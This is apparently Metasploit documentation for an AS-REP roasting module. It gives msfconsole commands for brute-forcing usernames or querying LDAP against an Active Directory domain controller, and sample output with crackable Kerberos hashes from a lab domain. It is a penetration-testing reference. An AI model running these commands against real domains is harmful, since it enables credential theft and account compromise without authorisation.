## ASREP-roast

The `auxiliary/gather/asrep` module can be used to find users who have Pre-authentication disabled,
and retrieve credentials that can be cracked using a hash-cracking tool.

The following ACTIONS are supported:

- **BRUTE_FORCE**: Make TGT requests for all usernames in a given file. This does not require
  valid domain credentials.
- **LDAP**: Request the set of users with pre-authentication disabled using an LDAP query, and
  then request TGTs for these users.

## Module usage

- Start `msfconsole`
- Do: `use auxiliary/gather/asrep`
- Do: `run action=BRUTE_FORCE user_file=<file> rhost=<IP> domain=<FQDN> rhostname=<hostname>`
- The module will attempt to request TGTs for each of the users in the file. This should not lock out accounts.
  A crackable value will be displayed for all identified accounts.
- Do: `run action=LDAP rhost=<IP> username=<LDAP_User> password=<LDAP_Password> domain=<FQDN> rhostname=<hostname>`
- The module will use LDAP to request the users without pre-auth required, and request TGTs for these users.
  A crackable value will be displayed for all identified accounts.

## Options

### DOMAIN
The Fully Qualified Domain Name (FQDN). Ex: mydomain.local.

### USER_FILE
The file containing a list of usernames, each on a new line.

### Rhostname

The hostname of the domain controller. Must be accurate otherwise the module will silently fail, even if users exist without pre-auth required.

### USE_RC4_HMAC
Request a ticket with the lower-security, more easily crackable, RC4_HMAC encryption type. This is 
usually preferable, but may be less stealthy.

## Scenarios

### Brute forcing users

An example of brute forcing usernames, in the hope of finding one with pre-auth not required:

```msf
msf6 auxiliary(gather/asrep) > run action=BRUTE_FORCE user_file=/tmp/users.txt rhost=192.168.1.1 domain=msf.local
[*] Running module against 192.168.1.1

$krb5asrep$23$user@MSF.LOCAL:9fb9954fa32193185ab32e2de2ab9f13$bf14e834c661246cad302073c228e6ff7894cd3023665f0f84338432c3929922ae998c4a23bb9d163dda536a230d0503b2cf575389317b52bde782264940e80206a29e9613e47328228441cf013fb1f6672359f6799be97b962de9429e8859f437e53549be6b11ca07af6f09eae6cd78279af6d7f6dcdfd011eccb74b4aa753b2f9e6561c59c9408ee4bec983777908f3a7eef5fba977710e47e4e8ac0af10608a7dd23db506202b27d7892bc28426d2080c343edfe243bf1cae554cf6204733082332be2455e4674e1c3e84614818a6c15b54221dcaa832

[*] Query returned 1 result.
[*] Auxiliary module execution completed
```

### Using LDAP

```
msf6 auxiliary(gather/asrep) > run action=LDAP rhost=192.168.1.1 username=azureadmin password=password ldap::auth=kerberos domain=msf.local domaincontrollerrhost=192.168.1.1 rhostname=dc22
[*] Running module against 192.168.1.1

[+] 192.168.1.1:88 - Received a valid TGT-Response
[*] 192.168.1.1:389 - TGT MIT Credential Cache ticket saved to /home/smash/.msf4/loot/20231124083018_default_192.168.1.1_mit.kerberos.cca_409871.bin
[+] 192.168.1.1:88 - Received a valid TGS-Response
[*] 192.168.1.1:389 - TGS MIT Credential Cache ticket saved to /home/smash/.msf4/loot/20231124083018_default_192.168.1.1_mit.kerberos.cca_923760.bin
[+] 192.168.1.1:88 - Received a valid delegation TGS-Response
[+] 192.168.1.1:389 Discovered base DN: DC=msf,DC=local
[+] 192.168.1.1:389 Discovered schema DN: DC=msf,DC=local

$krb5asrep$23$user@MSF.LOCAL:234e56b15bf3a0e3eb93d662ea6ded74$9889b0a449154c1353ea4db388af29381ad367771e2fe7d6a5644180e9f7ca0b1e836fc864f6d240e9ef91124edb13797dcb097f68c537279f80e3fc3c5c86f8f937af23bb2fd58274dd40ea184994cf31de50f508faac86c61749032b2d9e4ae4c74b0f76a0c242497e6765ddfba9c57743b19d4bb97aa3ef3b66cee50a1d3871b0b4ecd3f97d42781b6fb3d8839d8805ae1291d0e9ba07d374ed84ea39fadab548c2b40c87288b4465f234d0c3341e3b27c193a62a3ad7b0bdf04dbe5bf03815d48f766d1c727838f92dd36c437782975a978aefcb33e9

[*] Query returned 1 result.
[*] Auxiliary module execution completed
```
